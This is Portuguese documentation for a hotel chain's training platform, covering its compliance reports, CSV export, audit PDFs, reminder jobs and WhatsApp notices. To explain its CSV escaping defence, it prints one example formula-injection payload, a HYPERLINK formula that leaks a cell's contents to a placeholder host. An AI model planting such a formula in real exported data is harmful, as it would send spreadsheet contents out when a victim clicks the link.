# Conformidade e relatórios

_Quem deve o quê, e os papéis que a auditoria pede._

> Parte da documentação da **Academia Corporativa Tri Hotéis**. Índice em [../README.md](../README.md).

## Relatórios

| Tela | Responde |
| --- | --- |
| **Painel gerencial** | Como está a rede, **qual hotel está pior** e se a coisa melhorou nos últimos 6 meses. |
| **Conformidade** | Nome a nome: quem está em dia, atrasado, ou vence nos próximos 7 dias. É a pergunta que auditoria e RH fazem, e que a consolidação não responde. |
| **Primeiro acesso** | A senha que eu entreguei virou acesso? Quem nunca entrou, quem entrou e parou, e quem sequer tem curso atribuído. |
| **Relatório para auditoria** (PDF) | Por departamento e treinamento obrigatório: quem está regular, com o código de conferência de cada certificado. |

Conformidade considera **apenas matrículas obrigatórias**. Curso opcional não é
dívida de ninguém, e misturá-lo inflaria as pendências até o relatório virar
ruído.

### Painel gerencial

Da conta proprietária, em `/admin/relatorios`. Responde três perguntas, na
ordem em que a direção as faz: **como estamos**, **onde está o problema** e
**estamos melhorando**.

Duas coisas que os relatórios antigos não davam:

- **O recorte por hotel.** Numa rede de 25 casas, "Recepção" não é um lugar: a
  recepção do Canela e a de Gramado são equipes diferentes, com gerentes
  diferentes. Cortar só por departamento dilui a casa que está mal na média das
  outras 24. A tabela vem ordenada **pelo pior**, porque é por ele que a
  cobrança começa.
- **A série no tempo.** Tudo era foto do instante, e "42 atrasados" não diz
  nada sozinho: 42 vindo de 90 é uma equipe funcionando, 42 vindo de 10 é um
  incêndio. As barras separam o que a plataforma entregou do que foi treinado
  presencialmente — um mês inteiro presencial não é a plataforma funcionando.

Um grupo **sem obrigação atribuída** aparece como *"sem obrigações"*, e não
como 100%. Ele não está em dia: está sem medida, e exibir verde ali premiaria
justamente a casa onde ninguém cadastrou nada.

### Exportação em planilha (CSV)

Botão nas telas de **Conformidade**, **Usuários** e **Documentos**, e os três no
painel. Leva o filtro que está em tela — quem filtrou a Recepção do Canela baixa
aquela equipe, não a rede —, e o filtro vai no nome do arquivo
(`conformidade-canela-2026-09-12.csv`), porque três arquivos chamados
`conformidade.csv` na pasta de downloads é como alguém anexa o recorte errado
num e-mail para a auditoria.

O PDF de auditoria continua existindo, e não é redundante: ele é o documento
que se arquiva, fechado e com os códigos de conferência. O CSV é material de
trabalho — ordenar, filtrar e cruzar com a escala. Entregar só o PDF obriga
alguém a redigitar a lista numa planilha, que é como um relatório erra.

Três decisões de formato, todas em `src/lib/csv.ts`:

- **Ponto e vírgula, não vírgula.** O Excel usa o separador de lista do
  sistema, e em português esse separador é `;`. Um arquivo com vírgula abre com
  todas as colunas empilhadas numa só.
- **BOM na frente.** Sem ele o Excel não assume UTF-8 e "Conceição" chega como
  "ConceiÃ§Ã£o".
- **Célula que começaria com `=`, `+`, `-` ou `@` recebe um apóstrofo.**
  Planilha não é texto: é um programa. Um nome cadastrado como
  `=HYPERLINK("http://fora/?x"&A1;"Clique")` — plausível aqui, porque nomes
  chegam pela sincronização com a intranet, que é um banco que esta plataforma
  não controla — vira um link que carrega a planilha para fora quando alguém
  clica. O apóstrofo faz o Excel tratar a célula como texto; ele não aparece na
  tela nem ao copiar.

A exportação **recusa** acima de 20 mil linhas em vez de cortar. Entregar as
primeiras 20 mil de uma folha de conformidade seria pior do que não entregar:
o arquivo abriria, pareceria completo, e quem o levasse à auditoria estaria
afirmando que a rede tem menos pendências do que tem.

### Primeiro acesso

Existe por uma limitação da rede, e não por pedido de relatório: **ninguém tem
e-mail**. Não há lembrete automático possível para o funcionário — nem de
senha, nem de treinamento vencendo. A única cobrança é humana, e depende de
alguém saber a quem cobrar.

A senha provisória é entregue em papel, uma vez. Depois disso ninguém sabe se
ela foi usada, se o papel se perdeu, ou se a pessoa entrou e parou na primeira
tela. O `lastLoginAt` já era gravado a cada login, mas só aparecia na ficha
individual: descobrir quem faltava exigia abrir uma conta por vez.

Quatro situações, e a ordem entre as duas primeiras é a decisão do módulo:

| Situação | O que fazer, e **quem** faz |
| --- | --- |
| **Sem curso** | Ninguém atribuiu treinamento. Quem age é o **administrador**. |
| **Nunca entrou** | A senha não virou acesso. Quem age é o **gestor**, indo atrás da pessoa. |
| **Entrou, não começou** | Usou a senha e parou. Vale um empurrão. |
| **Ativo** | Concluiu ao menos uma aula. |

`sem_curso` vem antes de `nunca_entrou` de propósito: cobrar alguém por não ter
feito um treinamento que ninguém atribuiu a ela desmoraliza a cobrança inteira.
São ações de donos diferentes, e a tela precisa separar isso.

A lista é ordenada **por urgência, não por nome**: quem está parado há mais
tempo aparece primeiro. Uma senha entregue há dois meses e nunca usada é um
problema diferente de uma entregue ontem.

É pergunta distinta da Conformidade, e por isso mora separado: lá é "quem está
atrasado no que devia"; aqui é anterior a qualquer dívida. Alguém sem curso
obrigatório não aparece na conformidade nunca, e ainda assim pode ter recebido
uma senha que jamais usou.

### Obrigatoriedade em vários setores de uma vez

Na tela do curso, "Obrigatório para" aceita **marcar vários setores**, com
"Marcar todos" ao lado.

Existe por causa de como esta rede usa a plataforma: aqui o **departamento é o
hotel**. Marcar "Brigada de incêndio" como obrigatória para as 25 casas eram 25
idas ao formulário, e isso se repetia inteiro a cada curso novo — com seis
treinamentos obrigatórios, 150 marcações à mão. Esquecer uma casa deixa o hotel
irregular **sem ninguém notar**: a Conformidade o mostra em dia, porque ele não
deve nada. É o pior tipo de erro que este projeto pode produzir, porque não
aparece em lugar nenhum.

O prazo e a reciclagem valem igual para todos os setores marcados.

Duas decisões, e elas são diferentes de propósito:

- **Tudo ou nada nas recusas.** Se um setor marcado estiver fora do alcance de
  quem clicou, nada é gravado — igual ao cadastro de funcionários em lote.
  Gravar parte e reclamar do resto deixaria uma lista pela metade para
  reconciliar à mão.
- **Setor que já era obrigatório é pulado, não recusado.** É pedido já
  atendido, não erro de validação. Recusar o lote por causa dele obrigaria a
  pessoa a descobrir quais setores já têm e desmarcá-los um a um — exatamente o
  trabalho que o lote existe para tirar.

A sincronização das matrículas roda **uma vez**, no fim: ela varre os
obrigatórios do curso inteiro, então chamá-la por setor repetiria a varredura
da base de funcionários 25 vezes.

## Relatório para auditoria

Um botão na Conformidade gera o PDF que alguém vai pedir: **departamento →
treinamento obrigatório → pessoa**, com situação, data de conclusão, vencimento
e o **código de conferência** de cada certificado.

A organização é essa, e não por pessoa, porque a auditoria chega perguntando de
uma norma ("manipulação de alimentos, cozinha"), não de um funcionário.

O código em cada linha é o que separa o documento de uma afirmação: quem recebe
confere qualquer linha em `/validar`, sem login, e vê a mesma informação saindo
da fonte.

Respeita o filtro de departamento em tela, é servido com `cache-control:
no-store` — um relatório afirma uma situação numa data, e servir o de ontem
seria pior do que não servir — e a rota confere o papel **no banco**, não no
token: a sessão dura 8 horas, e quem perdeu o acesso administrativo nesse
intervalo não deve continuar baixando a folha da rede inteira.

## Resumo de conformidade por e-mail (opcional)

```bash
npm run conformidade:resumo            # levanta e envia
npm run conformidade:resumo -- --seco  # mostra o que sairia, sem enviar
```

A tela `/admin/conformidade` responde a pergunta que auditoria e RH fazem —
nome a nome, quem está em dia e quem está atrasado. O problema é que ela espera
alguém lembrar de abri-la, e treinamento obrigatório vencido não avisa que
venceu. Este resumo faz a pergunta chegar sozinha.

Defina `RESUMO_CONFORMIDADE_EMAIL` e agende:

```
0 8 * * 1  cd /caminho/do/projeto && npm run conformidade:resumo
```

Roda por agendador, e não dentro da aplicação, de propósito: a plataforma sobe
em modo standalone, sem processo de fundo, e um temporizador interno dispararia
de novo a cada reinício.

Três decisões que valem saber:

- **Sem nada a cobrar, nenhum e-mail.** Um resumo que chega toda semana dizendo
  "está tudo bem" é o que ensina quem recebe a arquivá-lo sem ler — e aí o da
  semana que importa vai junto.
- **Falha de envio termina com erro**, ao contrário do resto do sistema. Nos
  outros pontos o e-mail é um extra sobre algo que já deu certo; aqui é a única
  razão do script existir, e falhar em silêncio faria o agendador marcar
  sucesso enquanto o resumo parou de chegar.
- **A conta é a mesma da tela.** Ela mora em `src/lib/conformidade.ts`, usada
  pelos dois — uma tela dizendo doze atrasados e um e-mail dizendo nove é pior
  do que não ter o e-mail.

Sem `RESUMO_CONFORMIDADE_EMAIL` ou sem SMTP, o resumo é impresso na saída e o
script termina bem: dá para agendá-lo antes de configurar o e-mail e conferir o
que sairia.

## Lembretes automáticos (opcional)

A Conformidade sabe, nome a nome, quem está vencendo e quem está atrasado — mas
é uma **tela**, e fica parada até alguém abrir. Treinamento vencido não avisa
que venceu. Esta rotina faz a cobrança sair sozinha.

Ligue definindo `CRON_SECRET` e apontando o agendador da hospedagem para a rota:

```bash
# cron, toda segunda às 8h
0 8 * * 1  curl -fsS -X POST -H "x-cron-secret: SEU_SEGREDO" https://SEU-DOMINIO/api/tarefas
```

Mora numa rota, e não num temporizador dentro da aplicação, pelo mesmo motivo
do resumo de conformidade: o build é standalone, sem processo de fundo, e um
temporizador interno dispararia de novo a cada reinício e uma vez por instância.

**O que a rotina faz:**

- lê a **mesma** conta da Conformidade (a mesma função, não uma cópia);
- quem tem e-mail confirmado recebe o aviso na hora;
- quem não tem — a maioria desta rede — entra numa **fila de WhatsApp** que
  volta no corpo da resposta, com links `wa.me` prontos. Não há API de WhatsApp
  aqui, e fingir que há seria pior do que assumir que o canal é manual;
- responde um relatório JSON: avaliadas, novos, por e-mail, na fila, sem canal.

**Um aviso por estágio, não por execução.** `LembreteEnviado` guarda o que já
saiu com a chave (pessoa, curso, estágio). "Está vencendo" e "venceu" são
notícias diferentes e cada uma passa **uma vez** — o agendador pode repetir à
vontade sem virar spam, e chamar a rota duas vezes seguidas não manda nada duas
vezes.

**O que ela deliberadamente NÃO faz:** rematricular sozinha. Resetar o progresso
apagaria o certificado (ver [Reciclagem](treinamento.md#reciclagem-o-certificado-ainda-vale)),
que é justamente o papel que a auditoria pede. A rotina avisa; refazer a
matrícula continua sendo ato de quem administra.

Sem `CRON_SECRET`, a rota responde 503 e não faz nada — falha fechada.

## WhatsApp: o canal que existe

Ninguém nesta rede tem e-mail corporativo, e o pessoal é opcional. O resultado
era que **não havia caminho até o funcionário** — nem para entregar senha, nem
para cobrar treinamento. Toda comunicação dependia de alguém lembrar de falar
com alguém, pessoalmente.

WhatsApp, essa gente tem. O cadastro ganhou um campo de celular (opcional), e
as telas ganharam um botão que **abre o WhatsApp com a mensagem pronta**:

| Onde | Mensagem |
| --- | --- |
| **Primeiro acesso** | Lembra do treinamento, com o usuário — **sem senha** |
| **Conformidade** | Cobra o curso com prazo vencendo ou vencido |
| **Reciclagem** | Avisa que o certificado está deixando de valer |

### Sem API, sem custo, e manual de propósito

É um link `wa.me`. Quem administra clica, o WhatsApp abre com o texto, ele
confere e envia — do próprio número, do celular dele, no corredor do hotel.

Envio automático exigiria a API oficial paga, ou uma biblioteca não oficial que
derruba o número da empresa. Para algumas dezenas de pessoas, o clique resolve:
**o que não existia era o caminho, não a automação dele.**

O lembrete vai **sem senha**, e isso é decisão. A senha provisória não é
recuperável depois do cadastro; fingir que é levaria alguém a inventar uma, e
senha inventada num aviso é pior do que aviso nenhum. Quem perdeu a senha pede,
e o administrador redefine.

O número é guardado normalizado (`5541999999999`) e exibido legível
(`(41) 99999-9999`). Ele **não é único**: número de família repetido acontece,
e recusar o cadastro por isso deixaria alguém sem conta. É o oposto do e-mail —
aquele é chave de recuperação, este é só um caminho de aviso.
